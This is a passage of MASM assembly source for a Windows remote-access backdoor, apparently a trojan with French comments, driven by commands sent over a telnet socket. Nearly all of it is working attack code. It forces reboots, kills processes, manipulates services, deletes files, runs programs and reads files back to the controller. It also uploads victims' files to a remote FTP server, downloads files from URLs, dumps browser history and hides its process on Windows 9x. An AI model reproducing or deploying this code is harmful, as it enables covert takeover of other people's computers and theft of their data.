            .IF   al == '1'
            
                  mov   edi, EWX_REBOOT or EWX_FORCE
                  
            .ELSEIF al == '2'
            
                  mov   edi, EWX_POWEROFF or EWX_FORCE
                  
            .ELSEIF al == '3'
            
                  mov   edi, EWX_SHUTDOWN or EWX_FORCE
            .ELSEIF al == '4'
                  mov   edi, EWX_LOGOFF or EWX_FORCE      
            .ELSE
                invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
                jmp    Trjlp
            .ENDIF
            
            .IF     [OS_ver].dwPlatformId == VER_PLATFORM_WIN32_NT
                    invoke GetCurrentProcess
                    invoke OpenProcessToken, eax, TOKEN_ADJUST_PRIVILEGES+TOKEN_QUERY, ADDR hToken
                    invoke LookupPrivilegeValue, NULL, addr szShut, addr tkp.Privileges[0].Luid	
          	              mov tkp.PrivilegeCount, 1
          		        mov tkp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
          	              invoke AdjustTokenPrivileges, hToken, FALSE, ADDR tkp, 0, NULL, 0
          
            .ENDIF 

            invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd       
            invoke ExitWindowsEx, edi, NULL


     .ELSEIF    edi == ' gsm'       ; $MSG
     
            lea    edi, [TxtBuf]
           @@:
            lodsb
            stosb
            cmp     al, 0ah
            jnz     @B
            xor     al,al
            stosb
            lea     ecx,[MsgBoxThread]
            invoke  CreateThread, 0,0,ecx,0,0, addr MsgBoxThreadID
            invoke  CloseHandle, eax

            invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd

     
     .ELSEIF edi == '!rid'        ; dir!
        PrintDir:
                
            invoke  FindFirstFile, addr dirlst, addr wfd
            mov     hFind,eax
           EnumDirLp1:
            
            lea     edi, [wfd].cFileName
            mov     eax, edi
            call   _strlen
            mov     ecx, eax
            mov     al, ' '
            repnz   scasb

            lea     esi, [_sp]
            test    [wfd].dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
            jz      @F
            lea     esi, [_REP]
           @@:

            .IF     ECX == 0
                invoke wsprintf, addr serv_responsebuf, addr serv_find_templ,addr [wfd].cFileName, esi, [wfd].nFileSizeLow 
            .ELSE
                invoke wsprintf, addr serv_responsebuf, addr serv_find_templ,addr [wfd].cAlternate, esi, [wfd].nFileSizeLow             
            .ENDIF
            
            lea    eax, [serv_responsebuf]
            call   _strlen

            invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0            
            invoke  FindNextFile, hFind, addr wfd
            or      eax,eax
            jnz     EnumDirLp1
            invoke  FindClose, hFind
            jmp   Trjlp
            
            _REP db '<REP>',0
            _sp   db ' ',0
            
     .ELSEIF edi == 'wrid'      ; DIRW

            invoke  FindFirstFile, addr dirlst, addr wfd
            mov     hFind,eax
            XOR     EBX,EBX
            
           EnumDirLp2:
            INC     EBX
            
            lea     edi, [wfd].cFileName
            mov     eax, edi
            call   _strlen
            mov     ecx, eax
            mov     al, ' '
            repnz   scasb

            lea     esi, [_sp]
            test    [wfd].dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
            jz      @F
            lea     esi, [_REP]
           @@:

            .IF     ECX == 0
                invoke wsprintf, addr serv_responsebuf, addr serv_find_templ,addr [wfd].cFileName, esi, [wfd].nFileSizeLow 
            .ELSE
                invoke wsprintf, addr serv_responsebuf, addr serv_find_templ,addr [wfd].cAlternate, esi, [wfd].nFileSizeLow             
            .ENDIF
            lea    eax, [serv_responsebuf]
            call   _strlen
            invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0
            
            .IF     EBX ==  20
                    invoke send, TelnetClientSock, addr wait_msg, wait_msg_len, 0
                    lea    esi, serv_responsebuf
                    invoke recv, TelnetClientSock,esi, 1,0
                    .IF    byte ptr [esi] == 'n' || byte ptr [esi] == 'N'
                           jmp  QuitDir
                    .ENDIF
                    XOR     EBX,EBX
            .ENDIF
            
                        
            invoke  FindNextFile, hFind, addr wfd
            or      eax,eax
            jnz     EnumDirLp2
           QuitDir:
            invoke  FindClose, hFind
            jmp   Trjlp

     .ELSEIF edi    ==  '!rdc'

             .IF     [IsCDOpen] == 0
                     
                     invoke  mciSendStringA, addr szOpenString, 0, 0, 0
                     mov     IsCDOpen,1
             .ELSE
                     invoke  mciSendStringA, addr szCloseString, 0, 0, 0
                     mov     IsCDOpen,0
             .ENDIF
             .IF    EAX == 0
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
             .ELSE
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
             .ENDIF
             
     .ELSEIF edi == 'tsil'      ; list

            
            invoke send, TelnetClientSock, addr serv_lst_intro, serv_lst_intro_len, 0 
            
          .IF     [OS_ver].dwPlatformId == VER_PLATFORM_WIN32_NT


            push   OFFSET BytesNeeded
            push   SIZEOF processArray
            push   OFFSET processArray
            Call   _EnumProcesses


            
            mov    esi, OFFSET processArray
           @@:
            mov     ecx, dword ptr [esi]
            jecxz   Skipit
            invoke  OpenProcess, PROCESS_ALL_ACCESS, 0, ecx
            or      eax, eax
            jz      Skipit
            mov     ebx, eax
            
            
            push    SIZEOF FileNameBuf
            push    OFFSET FileNameBuf
            push    NULL
            push    ebx
            Call    _GetModuleFileNameExA
            
 
            sub     eax, 4
            js      NOgood

            invoke wsprintf, addr serv_responsebuf, addr serv_lst_templ, addr FileNameBuf, dword ptr [esi]
            mov    eax, OFFSET serv_responsebuf
            call   _strlen
            invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0   
              
            mov     ecx, (SIZEOF FileNameBuf) / 4
            mov     edi, OFFSET FileNameBuf
            xor     eax, eax
            rep     stosd
            
           NOgood:
            invoke  CloseHandle, ebx
           Skipit:
            add     esi, 4
            cmp     esi, (OFFSET processArray + 1024)
            jle      @B



                    
          .ELSE
            
            invoke   CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
            inc      eax
            jz       ErrNoSnapshot
            dec      eax
            mov      hSnapShot,eax

            
            
            mov      [PE].dwSize, sizeof PROCESSENTRY32
            invoke   Process32First, hSnapShot,addr PE

           @@:

            invoke wsprintf, addr serv_responsebuf, addr serv_lst_templ, addr [PE].szExeFile, [PE].th32ProcessID
            lea    eax, [serv_responsebuf]
            call   _strlen
            invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0     

            invoke   Process32Next, hSnapShot, addr PE
            or       eax,eax
            jnz      @B
            invoke   CloseHandle, hSnapShot
          ErrNoSnapshot:
       .ENDIF
            
            jmp   Trjlp
                 
     .ELSEIF edi == 'llik'  ; kill
            
            ;mov     dword ptr [cmd],edi
            ;lea     esi,[esi+1]
            inc     esi
            
            mov     ecx,40
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            mov     byte ptr [edi-2],0

            .IF     BYTE PTR [ESI] == '-'       ; nombre négatif ?
                    inc  esi
            .ENDIF
    
            invoke  atodw, esi
            .IF     BYTE PTR [ESI-1] == '-'
                    neg    eax
            .ENDIF
            
            invoke  OpenProcess, PROCESS_TERMINATE, 0, eax
            or      eax,eax
            jz      CantKill
            mov     ebx,eax
           
            invoke  TerminateProcess, ebx, 0
            push    eax
            invoke  CloseHandle,ebx
            pop     eax
            or      eax,eax
            jz      CantKill
            

            invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd

            jmp    killok
            
           CantKill:
            invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd

           killok:

     .ELSEIF edi == 'trvc' ;$CVRT

             inc     esi
             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,0ah
             repnz   scasb
             mov     byte ptr [edi-2],0

             invoke  GetShortPathName, esi, addr serv_responsebuf, SIZEOF serv_responsebuf
             or      eax, eax
             jnz     @F
             invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
            @@:
            
     .ELSEIF edi == 'lvrs' ;$SRVL

             inc     esi
             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,0ah
             repnz   scasb
             mov     byte ptr [edi-2],0

             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,' '
             repnz   scasb
             mov     byte ptr [edi-1],0
             
            .IF     [OS_ver].dwPlatformId == VER_PLATFORM_WIN32_WINDOWS
            
                    invoke wsprintf, addr serv_responsebuf, addr FuncNA_W9x_templ, addr cmd
                    lea    eax, [serv_responsebuf]
                    call   _strlen
                    invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0  
                    jmp    Trjlp
                    
            .ENDIF
            
            ;[-drv -W32 -ALL] 
            
            or      dword ptr [esi], 20202020h
            .IF     dword ptr [esi] == 'vrd-'
            
                    mov   esi, SERVICE_DRIVER
                    
            .ELSEIF dword ptr [esi] == '23w-'
            
                    mov   esi, SERVICE_WIN32
                    
            .ELSE
                    mov   esi, SERVICE_WIN32 or SERVICE_DRIVER
            .ENDIF
            
            ;[-a -r -s]
            
            or      word ptr [edi], 2020h
            .IF     word ptr [edi] == 'r-'
            
                    mov  edi, SERVICE_ACTIVE
                    
            .ELSEIF word ptr [edi] == 's-'
            
                    mov  edi, SERVICE_INACTIVE
                    
            .ELSE
            
                    mov  edi, SERVICE_STATE_ALL
                    
            .ENDIF
            
            mov     ServiceType, esi
            mov     ServiceStatus, edi
            Call    EnumServices
            jmp     Trjlp

     .ELSEIF edi == 'svrs' ;$SRVS

            .IF     [OS_ver].dwPlatformId == VER_PLATFORM_WIN32_WINDOWS
            
                    invoke wsprintf, addr serv_responsebuf, addr FuncNA_W9x_templ, addr cmd
                    lea    eax, [serv_responsebuf]
                    call   _strlen
                    invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0  
                    jmp    Trjlp
                    
            .ENDIF
            
            inc     esi            
            mov     ecx, sizeof BigTrjBuf
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            mov     byte ptr [edi-2],0

            mov     eax, esi
            Call    RunService

            .IF     EAX == 1
            
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
                    
            .ELSE
            
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
                    
            .ENDIF
            
     .ELSEIF edi == 'kvrs' ;$SRVK

            .IF     [OS_ver].dwPlatformId == VER_PLATFORM_WIN32_WINDOWS
            
                    invoke wsprintf, addr serv_responsebuf, addr FuncNA_W9x_templ, addr cmd
                    lea    eax, [serv_responsebuf]
                    call   _strlen
                    invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0  
                    jmp    Trjlp
                    
            .ENDIF
            
            inc     esi            
            mov     ecx, sizeof BigTrjBuf
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            mov     byte ptr [edi-2],0
            
            mov     eax, esi
            Call    StopService
            
            .IF     EAX == 1
            
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
                    
            .ELSE
            
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
                    
            .ENDIF

     .ELSEIF edi == 'dvrs' ;$SRVD

            .IF     [OS_ver].dwPlatformId == VER_PLATFORM_WIN32_WINDOWS
            
                    invoke wsprintf, addr serv_responsebuf, addr FuncNA_W9x_templ, addr cmd
                    lea    eax, [serv_responsebuf]
                    call   _strlen
                    invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0  
                    jmp     Trjlp
                    
            .ENDIF
            
            inc     esi            
            mov     ecx, sizeof BigTrjBuf
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            mov     byte ptr [edi-2],0
            
            mov     eax, esi
            Call    DelService
            
            .IF     EAX == 1
            
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
                    
            .ELSE
            
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
                    
            .ENDIF
                    
     .ELSEIF di == 'dc'  ; cd

          
            dec     esi
            ;mov     dword ptr [cmd],edi

            mov     ecx, sizeof BigTrjBuf
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            mov     byte ptr [edi-2],0
            
            invoke SetCurrentDirectory, esi 
            .IF    EAX != 0



                    invoke  wsprintf, addr serv_responsebuf, addr dir_content_templ, esi

                    mov     eax, OFFSET serv_responsebuf
                    call    _strlen
                    xchg    ecx, eax
                    invoke  send, TelnetClientSock, addr serv_responsebuf, ecx, 0

                    jmp  PrintDir
            .ELSE
            
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd

            .ENDIF

     .ELSEIF edi == 'idkm'         ;$MKDIR  

            inc  esi
            inc  esi

            mov     ecx, sizeof BigTrjBuf
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            mov     byte ptr [edi-2],0
            
            invoke CreateDirectory, esi, NULL
            .IF    eax != NULL
                   invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
            .ELSE
                   invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
            .ENDIF

     .ELSEIF edi == 'dnif'          ; $FIND

            inc     esi
            mov     ecx, sizeof BigTrjBuf
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            and     byte ptr [edi-2],0
            
            mov     edi, esi
            mov     ecx, sizeof BigTrjBuf
            mov     al,' '
            repnz   scasb                   ; 2nd param ?
            and     byte ptr [edi-1],0
            mov     pMatchString, edi
            dec     edi
           @@:
            inc     edi
            cmp     byte ptr [edi], 0
            jz      @F
            or      byte ptr [edi], 20h
            jmp     @B
           @@:


            
            .IF     byte ptr [esi] == '*'           ; All Drives ?
            
                    push    OFFSET FindCallBack
                    CAll    _FileSearchAllFixedDrives    
                      
            .ELSE
            
                    push    OFFSET FindCallBack
                    push    esi
                    CAll    _RecursivScan
                    
            .ENDIF
    
            invoke wsprintf, addr serv_responsebuf, addr fsearch_resp_templ, dword ptr [FileCounter]
            and    dword ptr [FileCounter], 0
            
     .ELSEIF edi == 'idmr'          ; $RMDIR
     
            inc  esi
            inc  esi

            mov     ecx, sizeof BigTrjBuf
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            mov     byte ptr [edi-2],0
            
            invoke RemoveDirectory, esi
            .IF    eax != NULL
                   invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
            .ELSE
                   invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
            .ENDIF
            
     .ELSEIF edi == ' ner'          ; ren
     
            mov     ecx, sizeof BigTrjBuf
            mov     edi,esi
            mov     al,0ah
            repnz   scasb
            and     byte ptr [edi-2],0
            
            mov     edi, esi
            mov     ecx, sizeof BigTrjBuf
            mov     al,' '
            repnz   scasb
            and     byte ptr [edi-1],0

            invoke  MoveFile, esi, edi
            
            .IF     eax !=  NULL
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
            .ELSE
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
            .ENDIF
             
     .ELSEIF edi == ' led'          ; del

             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,0ah
             repnz   scasb
             mov     byte ptr [edi-2],0
            ;mov     dword ptr [cmd],edi
            invoke  DeleteFile, esi
            .IF     EAX != 0
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd

            .ELSE
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
            .ENDIF

     .ELSEIF edi    ==  'lniw' ;$WINL
     
             invoke  send, TelnetClientSock, addr enumwin_msg, enumwin_msg_len,0
             push  TelnetClientSock
             push  OFFSET EnumWindowsProc
             Call  EnumWindows
             jmp   Trjlp
             
     ;.ELSEIF edi    ==  'sniw' ;$WINS


            
     .ELSEIF edi    ==  'cexe' ;$EXEC
     
             inc     esi
             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,0ah
             repnz   scasb
             mov     byte ptr [edi-2],0
             mov     edi,esi
             mov     eax,edi
             call    _strlen
             mov     ecx,eax
             mov     al,' '
             repnz   scasb
             jecxz   @F
             mov     byte ptr [edi-1],0
            @@:
             invoke ShellExecute, hWin, addr szOpen, esi, edi, 0, SW_SHOWNORMAL 
             .IF    EAX > 32
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
             .ELSE
                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
             .ENDIF
             
     .ELSEIF edi    ==  'nepo' ;$OPEN
     

             inc     esi
             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,0ah
             repnz   scasb
             mov     byte ptr [edi-2],0
             .IF     byte ptr [esi] == '*'        ; *LOG

                    invoke SetFilePointer, hLog, NULL, NULL, FILE_BEGIN
                    mov     eax, hLog

             .ELSE
             invoke CreateFile, esi, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE,\
                                NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL
             .ENDIF 
                               
             .IF    eax != INVALID_HANDLE_VALUE
                     
                     mov    ebx, eax
                     invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
                     invoke GetFileSize, ebx, NULL
                     .IF    eax > 500000
                             invoke  send, TelnetClientSock, addr file2big_msg, file2big_msg_len, 0
                             invoke  CloseHandle, ebx
                             jmp     OpenErr
                     .ENDIF
                     mov     edi, esi
                     mov     esi, eax
                     invoke  VirtualAlloc, NULL, esi, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
                     or      eax,eax
                     jz      ErrCloseHnd
                     mov     pAlloc, eax
                     
                     invoke  ReadFile, ebx, pAlloc, esi, addr Read, NULL
                     .IF     byte ptr [pAlloc] == 0FFh || byte ptr [pAlloc] == 0FEh || byte ptr [pAlloc] == 0EFh

                           FreeMemUnicode:
                             invoke  VirtualFree, pAlloc, esi, MEM_DECOMMIT or MEM_RELEASE  
                             invoke CloseHandle, ebx
                             invoke  send, TelnetClientSock, addr file_unicode_msg, file_unicode_msg_len, 0
                             jmp     OpenErr
                             
                     .ENDIF  
                     push    edi         
                     mov     ecx, esi                ; Another unicode-format-like ?
                     and     ecx, 07Fh
                     mov     edi, pAlloc
                     xor     al, al
                     repnz   scasb
                     pop     edi
                     jecxz   @F
                     jmp     FreeMemUnicode
                    @@:
                    
                     invoke  send, TelnetClientSock, pAlloc, esi, NULL 
                     invoke  VirtualFree, pAlloc, esi, MEM_DECOMMIT or MEM_RELEASE
                    ErrCloseHnd:
                     .IF     byte ptr [edi] != '*'        ; *LOG
                        invoke CloseHandle, ebx
                     .ELSE
                        invoke SetFilePointer, hLog, NULL, NULL, FILE_END
                     .ENDIF
                     
             .ELSE
                    OpenErr:
                     invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
                    
             .ENDIF      
             

             
     .ELSEIF edi    ==  'tupf' ;$FPUT

             inc     esi                        ; 1st param file to transfer
             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,0ah
             repnz   scasb
             mov     byte ptr [edi-2],0
             mov     edi,esi                    
             mov     eax,edi
             call    _strlen
             mov     ecx,eax
             mov     al,' '
             repnz   scasb
             jecxz   @F
             mov     byte ptr [edi-1],0
             
             push    edi                        ; 2nd param server name
             
             
             mov     eax,edi
             call    _strlen
             mov     ecx,eax
             mov     al,' '
             repnz   scasb
             jecxz   @F
             mov     byte ptr [edi-1],0
             mov     ebx,edi                   ; third param username
             mov     eax,edi
             call    _strlen
             mov     ecx,eax
             mov     al,' '
             repnz   scasb
             jecxz   @F

             mov     byte ptr [edi-1],0
             mov     dword ptr [pPassword], edi ; fourth param password
             
             pop     edi
             
            @@:
            
             
             invoke InternetOpen, addr ProgName, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL

             inc    eax
             jz     @FPUTErr
             dec    eax
             mov    hSession, eax
             invoke InternetConnect, hSession, edi, INTERNET_DEFAULT_FTP_PORT, ebx, pPassword, \
                                     INTERNET_SERVICE_FTP, NULL, NULL

             
             or     eax, eax
             jz     @FPUTErr                   
             mov    hFtpSession, eax
             mov    edi, esi
             xor    al, al
             xor    ecx,ecx
             dec    ecx
             repnz  scasb
             std
             mov    al, '\'
             repnz  scasb
             cld
             inc    edi
             inc    edi

             invoke send, TelnetClientSock, addr transfer_en_cours_msg, transfer_en_cours_msg_len, 0

             invoke FtpPutFile, hFtpSession, esi, edi, INTERNET_FLAG_TRANSFER_BINARY, NULL
             .IF     eax == 1
                     invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
             .ELSE
                   @FPUTErr:
                     invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
             .ENDIF  
             
             .IF    hFtpSession != 0       
                invoke InternetCloseHandle, hFtpSession
             .ENDIF
             .IF    hSession != 0       
                invoke InternetCloseHandle, hSession
             .ENDIF


             
     .ELSEIF edi    ==  'ldsw' ;$WSDL
     
             inc     esi
             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,0ah
             repnz   scasb
             mov     byte ptr [edi-2],0

             mov     edi,esi
             mov     ecx, sizeof BigTrjBuf
             mov     al,' '
             repnz   scasb
             mov     byte ptr [edi-1],0
                          
             
             invoke InternetOpen, addr ProgName, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL
             
             .IF eax != INVALID_HANDLE_VALUE
             
                    mov hSession, eax
                    invoke InternetOpenUrl, hSession, esi, NULL, NULL, NULL, NULL
                    
                    .IF eax != INVALID_HANDLE_VALUE
                    
                            mov     byte ptr [edi-1],' '
                            mov hUrl, eax
                             
                            
                            mov    DlBufferLen, SIZEOF DlBuffer
                            mov    ebx, CREATE_NEW
                           @@:
                            invoke CreateFile, edi, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ,\
                                                    NULL, ebx, FILE_ATTRIBUTE_NORMAL,NULL
                            .IF    eax == INVALID_HANDLE_VALUE                        
 
                                   invoke send, TelnetClientSock, addr fileexist_msg, fileexist_msg_len, 0
                                   invoke recv, TelnetClientSock,esi, 1,0
  
                                   .IF    byte ptr [esi] == 'o' || byte ptr [esi] == 'O'
                                   
                                        mov    ebx, CREATE_ALWAYS
                                        jmp  @B         ; ecraser le fichier!
                                        
                                   .ENDIF

                                   
                                   jmp    Trjlp
                                   
                            .ELSE
                            
                                   mov    hDlFile,eax

                                    invoke send, TelnetClientSock, addr transfer_en_cours_msg, transfer_en_cours_msg_len, 0
                                   @@:
                                    invoke InternetReadFile, hUrl, addr DlBuffer, sizeof DlBuffer, addr DlBufferLen
                                    .IF DlBufferLen != 0 
                                        invoke WriteFile, hDlFile, addr DlBuffer, DlBufferLen, ADDR Written, NULL
                                        jmp @B
                                    .ENDIF

                                    invoke CloseHandle, hDlFile
                                    invoke InternetCloseHandle, hUrl
                                    invoke InternetCloseHandle, hSession
                                    invoke wsprintf, addr serv_responsebuf, addr serv_resp_templ, addr cmd
                                    jmp    DlOk
                                    
                            .ENDIF
                            
                    .ENDIF
                    

             
             .ENDIF
             
             invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
            DlOk:

     .ELSEIF edi    == 'tsih' ;$HIST


           invoke send, TelnetClientSock, addr WSVISIT, WSVISIT_len, 0 
           and    CTR, 0
           
           lea          ebx,[UrlBuf]
           push         ebx
          @@:
           cmp          byte ptr [ebx],0
           jz           @F
           and          byte ptr [ebx],0
           inc          ebx
           jmp          @B
          @@:
           pop          ebx
           assume       ebx : ptr INTERNET_CACHE_ENTRY_INFO 
           mov          [ebx].dwStructSize, sizeof  INTERNET_CACHE_ENTRY_INFO
           invoke       FindFirstUrlCacheEntry,NULL,ebx, addr  UrlBufSize
           mov          hCE,eax
          ContEnumHist:


           xor     al, al
           mov     edi, [ebx].lpszLocalFileName
           or      edi,edi                                 
           jz      no_more_urls
           repnz   scasb
           std     
           mov     al,'.'
           or      edi,edi                                 
           jz      no_more_urls
           repnz   scasb
           cld

     
           cmp     word ptr [edi+3],'mt'       ;h'tm'l ??
           jz      ok 
           cmp     byte ptr [edi+4],'p'        ; ph'p', as'p' ???
           jnz     ne_pas_effacer
          ok:   

           ;invoke DeleteUrlCacheEntry, [ebx].lpszSourceUrlName          ; effacer
           invoke lstrcpy, addr OutUrlBuf, [ebx].lpszSourceUrlName      
           invoke lstrcat, addr OutUrlBuf, addr CRLF 
           lea    eax, [OutUrlBuf]
           call   _strlen    
           invoke send, TelnetClientSock, addr OutUrlBuf, eax, 0 

           inc     CTR 
           ne_pas_effacer:
           
           invoke FindNextUrlCacheEntry,hCE, ebx, addr  UrlBufSize 
           Call   GetLastError
           
           
           .IF    CTR ==  10
                    push   eax
                    invoke send, TelnetClientSock, addr wait_msg, wait_msg_len, 0
                    invoke recv, TelnetClientSock,esi, 1,0
                    pop    eax
                    .IF    byte ptr [esi] == 'n' || byte ptr [esi] == 'N'
                           jmp  no_more_urls
                    .ENDIF
                    and    CTR, 0
           .ENDIF

           cmp    eax, ERROR_NO_MORE_ITEMS 
           jnz    ContEnumHist

           
           no_more_urls:
           assume ebx : nothing
           invoke FindCloseUrlCache, hCE
           jmp   Trjlp

     .ELSEIF edi    == 'bewa' ;$AWEB
           invoke send, TelnetClientSock, addr aweb_mode_msg, aweb_mode_msg_size, 0
           invoke recv, TelnetClientSock,esi, 1,0
           
           .IF    byte ptr [esi] == '1'
           .ELSEIF byte ptr [esi] == '2'
           .ELSEIF byte ptr [esi] == '3'
           .ELSE
                invoke wsprintf, addr serv_responsebuf, addr serv_resp_err_templ, addr cmd
           .ENDIF
           
     .ELSEIF edi    == 'tixe' ;$EXIT 
           
            invoke send, TelnetClientSock, addr quitmsg, quitmsg_size, 0      ; Send Response
           ExitCMD:
            invoke  closesocket, TelnetClientSock
            and    dword ptr [TelnetClientSock], NULL
            jmp    @BackDoorErr 
     .ELSE
      
           
           invoke send, TelnetClientSock, addr InvalidCmdMsg, InvalidCmdMsg_size, 0 
           jmp   Trjlp
     .ENDIF
     
      lea    eax, [serv_responsebuf]
      call   _strlen
      invoke send, TelnetClientSock, addr serv_responsebuf, eax, 0      ; Send Response
     

    
    
     
     jmp   Trjlp
    SendHelp:
     invoke send, TelnetClientSock, addr helpstr, helpsize, 0
     jmp   Trjlp
    @BackDoorErr:
     
     invoke ExitThread,eax  
     ret



BackdoorThread   endp


;################################################################################################
;#  FindCallBack : this is the callback which proceeds the result of RecursivScan Call.         #
;#                                                                                              #
;################################################################################################

FindCallBack    proc pFileFound:DWORD, FileSize:DWORD

        ;LOCAL  pMatchString:DWORD
        LOCAL  MatchStringLen:DWORD
        
        

        mov    eax, dword ptr [pMatchString]
        mov    bl,  byte ptr [eax]
        mov    ecx, 512
        mov    edi, pFileFound
        mov    eax, edi
        call   _ToLower
        mov    eax, edi
        call   _strlen
        add    edi, eax
       @@:
        dec    edi
        cmp    byte ptr [edi], '\'
        jnz    @B

       ContinueScan:
        inc    edi
        cmp    byte ptr [edi], 0
        jz     NotThisFile
        cmp    byte ptr [edi], bl
        jnz    ContinueScan
        

        
        mov    eax, pMatchString 
        call   _strlen
        mov    MatchStringLen, eax
        mov    bh, 0
        xchg   bh, byte ptr [edi + eax]      ; temprorary Null Terminate
        
        invoke lstrcmpi, edi, pMatchString
        mov    ecx, MatchStringLen
        xchg   bh, byte ptr [edi + ecx]      ; restore old byte
        or     eax, eax
        jnz    ContinueScan
        
        invoke wsprintf, addr FindBuf, addr FindTempl, pFileFound, FileSize 
        mov    eax, OFFSET FindBuf
        call   _strlen
        invoke send, TelnetClientSock, addr FindBuf, eax, 0 
        inc    dword ptr [FileCounter]
       NotThisFile:
        ret
FindCallBack    endp


MsgBoxThread    proc    
           invoke MessageBox, 0, addr TxtBuf, 0, MB_SYSTEMMODAL or MB_ICONWARNING
           invoke ExitThread, eax
MsgBoxThread    endp

.data
win_templ     db "%s    |--|     %s",0dh,0ah,0
.code

EnumWindowsProc proc uses esi   WinHandle:DWORD, outsock:DWORD 
            

            invoke      GetWindowText, WinHandle, addr winnamebuf, SIZEOF winnamebuf
            invoke      GetClassName, WinHandle, addr winclassbuf, SIZEOF winclassbuf
            invoke      wsprintf, addr winbigbuf, addr win_templ, addr winnamebuf, addr winclassbuf
            lea         esi, [winbigbuf]
            mov         eax, esi
            Call        _strlen
            invoke      send, outsock, esi, eax, 0
            xor         eax, eax
            inc         eax
            ret
EnumWindowsProc endp



Stealth9x   proc
      invoke GetModuleHandle, addr kernel

      invoke GetProcAddress, eax, addr RSP
      push   1                              ; RSP_SIMPLE_SERVICE	
      push   NULL
      Call   eax
      ret
Stealth9x   endp

OpenLogFile proc 

      invoke CreateFile, addr record_file, GENERIC_READ OR GENERIC_WRITE, NULL,\;FILE_SHARE_READ or FILE_SHARE_WRITE,\ ;
                         NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL
      mov    hLog,eax 	
      invoke SetFilePointer, hLog, NULL, NULL, FILE_END	
      ret
OpenLogFile endp

CloseLogFile proc
      cmp    hLog,NULL
      jz     @F
      invoke CloseHandle, hLog
      and    hLog,NULL
     @@:
      ret
CloseLogFile endp




TimeDateUsrInfo proc
      invoke GetDateFormat,  LOCALE_USER_DEFAULT, NULL, NULL, NULL,\
                             addr Dbuf, sizeof Dbuf
      invoke GetTimeFormat,NULL,TIME_FORCE24HOURFORMAT , NULL, NULL, \
                             addr Tbuf,9

      mov    UsrNSize, sizeof Ubuf
      invoke GetUserName, addr Ubuf, addr UsrNSize
      invoke wsprintf, addr TDUinfo, addr TDUtempl, addr Ubuf, addr Dbuf, addr Tbuf
      ret
TimeDateUsrInfo endp



.data
enum_service_info       db 0dh,0ah,0dh,0ah,"ServiceName : DisplayName",0dh,0ah,0dh,0ah,0
enum_service_info_len   equ $ - OFFSET enum_service_info

;enum_service_lst_templ  db "%s, %s",0dh,0ah,0
_2points       db ' : '
.code

EnumServices    proc  uses ebx 
          LOCAL     hSCM    :DWORD
